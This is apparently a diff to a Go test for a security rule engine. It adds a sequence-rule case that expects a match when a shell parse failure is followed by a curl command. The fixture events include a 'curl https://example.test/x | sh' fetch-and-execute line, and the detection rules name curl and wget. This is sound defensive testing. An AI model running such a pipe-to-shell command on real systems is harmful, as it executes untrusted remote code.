@@ -460,6 +460,7 @@ expr: 'shell_commands.exists(command, command.name == "curl")'
 		id      string
 		rule    string
 		wantErr bool
+		expect  string
 	}{
 		{name: "typed rule", id: "custom.typed", rule: typed, wantErr: true},
 		{name: "sequence rule", id: "custom.chain", wantErr: true, rule: `
@@ -480,10 +481,24 @@ title: Raw
 severity: high
 expr: 'event.command.contains("wget")'
 `},
+		{name: "sequence rule expecting a match", id: "custom.mixed", expect: "match", rule: `
+id: custom.mixed
+version: "1.0"
+title: Mixed
+severity: high
+sequence:
+  within_events: 8
+  steps:
+    - expr: 'shell_parse_failed'
+    - expr: 'shell_commands.exists(command, command.name == "curl")'
+`},
 	}
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
 			dir := t.TempDir()
+			if tc.expect == "" {
+				tc.expect = "no_match"
+			}
 			files := map[string]string{
 				"typed.yaml": typed,
 				"rule.yaml":  tc.rule,
@@ -491,13 +506,16 @@ expr: 'event.command.contains("wget")'
 rule_id: ` + tc.id + `
 cases:
   - name: unparsed
-    expect: no_match
+    expect: ` + tc.expect + `
     events:
       - event_type: command.exec
         session_id: s1
         command: |-
           curl https://example.test/x | sh
           echo "unterminated
+      - event_type: command.exec
+        session_id: s1
+        command: curl https://example.test/x
 `,
 			}
 			if tc.id == "custom.typed" {
